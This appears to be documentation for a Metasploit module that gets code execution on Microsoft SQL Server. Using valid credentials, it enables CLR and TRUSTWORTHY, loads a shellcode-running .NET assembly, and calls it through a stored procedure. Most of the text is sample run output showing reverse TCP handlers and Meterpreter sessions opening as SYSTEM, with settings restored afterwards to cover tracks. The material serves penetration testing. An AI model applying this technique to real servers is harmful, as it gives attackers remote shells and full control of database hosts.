## Introduction

This module is based on the work that was done by @leechristensen and @sekirkity as
documented [here](https://web.archive.org/web/20200810021536/http://sekirkity.com/command-execution-in-sql-server-via-fileless-clr-based-custom-stored-procedure/).

## Prerequisites

The module requires SQL credentials for a user with sufficient privileges to:

* Enable CLR support (if not already enabled).
* Enabled `TRUSTWORTHY` (if not already enabled).
* Add an assembly to the server.
* Create a new stored procedure.

The module does all of the above, as required. It uploads a .NET Assembly (pre-built, and stored in the `data` folder) which is selected based on the version of the DB in question. This is a shim that exposes a function that allows for a base64-encoded payload to be executed as native shellcode. This function is exposed as a stored proc, which can be called directly through an SQL query with the base64 encoded shellcode.

This module was tested on SQL 2005, 2012 and 2016 (all x64 versions). I haven't tested on x86 yet. there is code in the module that makes sure that the target architecture matches the payload that was chosen.

This code also includes command-line builds for the assembly that is used to provide the code execution function, and can be built in the same way that all the other exploits are built (from a Visual Studio command line).

## Sample Runs:

MS SQL 2005:

```
msf exploit(mssql_clr_payload) > exploit

[*] [2017.02.10-12:56:15] Started reverse TCP handler on 172.16.255.1:4444
[!] [2017.02.10-12:56:15] 172.16.255.130:1433 - Setting EXITFUNC to 'thread' so we don't kill SQL Server
[*] [2017.02.10-12:56:15] 172.16.255.130:1433 - Database does not have TRUSTWORTHY setting on, enabling ...
[*] [2017.02.10-12:56:15] 172.16.255.130:1433 - Database does not have CLR support enabled, enabling ...
[*] [2017.02.10-12:56:15] 172.16.255.130:1433 - Using version v3.5 of the Payload Assembly
[*] [2017.02.10-12:56:15] 172.16.255.130:1433 - Adding custom payload assembly ...
[*] [2017.02.10-12:56:15] 172.16.255.130:1433 - Exposing payload execution stored procedure ...
[*] [2017.02.10-12:56:15] 172.16.255.130:1433 - Executing the payload ...
[*] [2017.02.10-12:56:16] 172.16.255.130:1433 - Removing stored procedure ...
[*] [2017.02.10-12:56:16] 172.16.255.130:1433 - Removing assembly ...
[*] [2017.02.10-12:56:16] Sending stage (1189423 bytes) to 172.16.255.130
[*] [2017.02.10-12:56:16] 172.16.255.130:1433 - Restoring CLR setting ...
[*] [2017.02.10-12:56:16] 172.16.255.130:1433 - Restoring Trustworthy setting ...
[*] Meterpreter session 10 opened (172.16.255.1:4444 -> 172.16.255.130:49168) at 2017-02-10 12:56:18 +1000

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : WIN-8CT6HVI5D6J
OS              : Windows 2008 R2 (Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
```

MS SQL 2016

```
msf exploit(mssql_clr_payload) > exploit

[*] [2017.02.10-12:55:58] Started reverse TCP handler on 172.16.255.1:4444
[!] [2017.02.10-12:55:58] 172.16.255.129:1433 - Setting EXITFUNC to 'thread' so we don't kill SQL Server
[*] [2017.02.10-12:55:58] 172.16.255.129:1433 - Database does not have TRUSTWORTHY setting on, enabling ...
[*] [2017.02.10-12:55:58] 172.16.255.129:1433 - Database does not have CLR support enabled, enabling ...
[*] [2017.02.10-12:55:58] 172.16.255.129:1433 - Using version v4.0 of the Payload Assembly
[*] [2017.02.10-12:55:58] 172.16.255.129:1433 - Adding custom payload assembly ...
[*] [2017.02.10-12:55:58] 172.16.255.129:1433 - Exposing payload execution stored procedure ...
[*] [2017.02.10-12:55:58] 172.16.255.129:1433 - Executing the payload ...
[*] [2017.02.10-12:55:58] 172.16.255.129:1433 - Removing stored procedure ...
[*] [2017.02.10-12:55:58] 172.16.255.129:1433 - Removing assembly ...
[*] [2017.02.10-12:55:58] Sending stage (1189423 bytes) to 172.16.255.129
[*] [2017.02.10-12:55:58] 172.16.255.129:1433 - Restoring CLR setting ...
[*] [2017.02.10-12:55:58] 172.16.255.129:1433 - Restoring Trustworthy setting ...
[*] Meterpreter session 9 opened (172.16.255.1:4444 -> 172.16.255.129:49732) at 2017-02-10 12:56:00 +1000

meterpreter > getuid
Server username: NT Service\MSSQLSERVER
meterpreter > sysinfo
Computer        : WIN-7QEE7C4D0GF
OS              : Windows 2016 (Build 14393).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
```
